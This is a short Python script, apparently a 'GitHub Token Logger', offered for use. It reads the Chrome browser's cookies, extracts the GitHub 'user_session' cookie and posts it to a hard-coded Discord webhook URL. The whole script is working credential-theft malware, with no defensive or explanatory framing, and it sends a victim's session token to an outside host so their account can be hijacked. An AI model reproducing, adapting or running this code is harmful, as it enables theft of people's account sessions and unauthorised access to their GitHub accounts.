# Enter your webhook below
webhook = "https://discord.com/api/webhooks/867935142503653376/E3OlQqZbp3SfJgX9Vqm0ACWZOhIBqBaTsuf_HfkGmIEUt2ttObJZ32syP4JgRBibCbNp"


import browser_cookie3
import requests
browserCookieList = browser_cookie3.chrome()
stringCookieList = str(browserCookieList)
splitted = stringCookieList.split(", ")
for line in splitted:
	if 'user_session=' in line:
		finalCookie = line.split(" ")
		global githubCookie
		githubCookie = finalCookie[1]

req = requests.post(url=webhook, data={"username": "GitHub Token Logger | github.com/localsgithub", "content": f"Logged Cookie:\n```{githubCookie}```"})
print(req.text)